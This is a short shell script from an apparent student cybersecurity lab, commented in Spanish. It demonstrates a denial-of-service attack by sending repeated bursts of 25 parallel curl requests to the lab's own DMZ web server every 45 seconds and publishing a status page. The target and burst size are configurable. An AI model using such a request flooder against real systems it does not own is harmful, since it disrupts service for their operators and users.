#!/bin/sh
# Modulo 01 - Ataque de denegacion de servicio (DoS) - DEMOSTRACION CONTROLADA
# Laboratorio de Ciberseguridad de David Santiago Cantor Torres.
# Envia rafagas modestas de peticiones UNICAMENTE al servidor DMZ propio del
# laboratorio, con fines educativos (evidenciar trafico en los logs).
set -u

TARGET_URL="${TARGET_URL:-https://servidor-web-dmz-dscantor.onrender.com}"
PORT="${PORT:-8080}"
RAFAGA="${RAFAGA:-25}"          # peticiones por rafaga (valor demostrativo)
INTERVALO="${INTERVALO:-45}"    # segundos entre rafagas

demo() {
  echo "=============================================================="
  echo "[DoS] $(date '+%Y-%m-%d %H:%M:%S') Enviando $RAFAGA peticiones a $TARGET_URL"
  i=1
  while [ "$i" -le "$RAFAGA" ]; do
    curl -s -o /dev/null -w "[DoS] #$i -> HTTP %{http_code} en %{time_total}s\n" "$TARGET_URL" &
    i=$((i + 1))
  done
  wait
  echo "[DoS] Rafaga completada."
}

# Ejecuta la demostracion en segundo plano de forma periodica.
( while true; do demo; sleep "$INTERVALO"; done ) &

# Pagina de estado para que Render mantenga el servicio "Live".
cat > /app/index.html <<HTML
<!doctype html><meta charset="utf-8"><title>Modulo 01 - DoS - dscantor</title>
<body style="font-family:Arial;background:#1a0b0b;color:#fff;padding:40px">
<h1>Modulo 01 - Ataque DoS (demostracion)</h1>
<p>Laboratorio de Ciberseguridad de David Santiago Cantor Torres</p>
<p>Rafagas de $RAFAGA peticiones cada $INTERVALO s al servidor DMZ.</p>
<p>Objetivo: $TARGET_URL</p></body>
HTML

cd /app
exec python3 -m http.server "$PORT"
